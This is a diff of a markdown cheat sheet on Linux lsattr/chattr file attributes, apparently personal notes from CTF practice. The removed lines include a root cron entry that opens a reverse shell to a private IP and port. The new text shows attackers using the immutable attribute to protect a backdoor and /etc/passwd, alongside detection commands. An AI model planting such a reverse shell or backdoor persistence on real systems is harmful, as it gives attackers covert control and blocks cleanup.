@@ -1,26 +1,53 @@
-# lsattr / chattr
+# lsattr/chattr file attributes because filesystem permissions aren't enough.
 
-```
-* * * * * root /bin/bash -c '/bin/sh -i >& /dev/tcp/10.14.66.169/5544 0>&1'nclude/config/net/team/mode/activebackup.h
-root@foodctf:/root# lsattr 
---------------e--- ./king.txt
-----i---------e--- ./koth
---------------e--- ./hello.txt
-----i---------e--- ./flag
-```
-
-
-
-```
-root@foodctf:/root# sudo /usr/src/usr/bin/chattr -i hello.txt 
-root@foodctf:/root# sudo /usr/src/usr/bin/chattr -a hello.txt
+## view attributes
+```bash
+lsattr file.txt                         # show file attributes
+lsattr -d directory/                    # directory attributes only
+lsattr -R directory/                    # recursive listing
+lsattr -a                               # include hidden files
 ```
 
-[https://www.baeldung.com/linux/lsattr-chattr-attributes](https://www.baeldung.com/linux/lsattr-chattr-attributes)
+## common attributes
+```
+i = immutable (cannot modify/delete)
+a = append-only (can only append data)
+e = extent format (ext4 default)
+s = secure deletion (zero on delete)
+u = undeletable (allow undelete)
+```
 
-[https://www.tecmint.com/chattr-command-examples/](https://www.tecmint.com/chattr-command-examples/)
+## modify attributes
+```bash
+chattr +i file.txt                      # make immutable
+chattr -i file.txt                      # remove immutable
+chattr +a logfile.txt                   # append-only mode
+chattr -a logfile.txt                   # remove append-only
+chattr +s sensitive.txt                 # secure deletion
+```
 
+## attribute combinations
+```bash
+chattr +ai file.txt                     # append-only + immutable
+chattr -ai file.txt                     # remove both
+chattr =i file.txt                      # set only immutable (clear others)
+```
 
+## persistence vector
+attackers use immutable attribute to prevent cleanup:
+```bash
+chattr +i /tmp/.hidden_backdoor         # make backdoor undeletable
+chattr +i /etc/passwd                   # prevent user removal
+```
 
+## defense/analysis
+```bash
+find /tmp -type f -exec lsattr {} \; | grep "\-i\-"    # find immutable files
+lsattr /etc/passwd /etc/shadow          # check critical files
+```
 
-
+## notes
+[!] immutable files cannot be deleted even by root
+[!] remove +i attribute before trying to delete files  
+[!] append-only useful for log files - prevents tampering
+[!] some attributes require filesystem support (ext2/3/4)
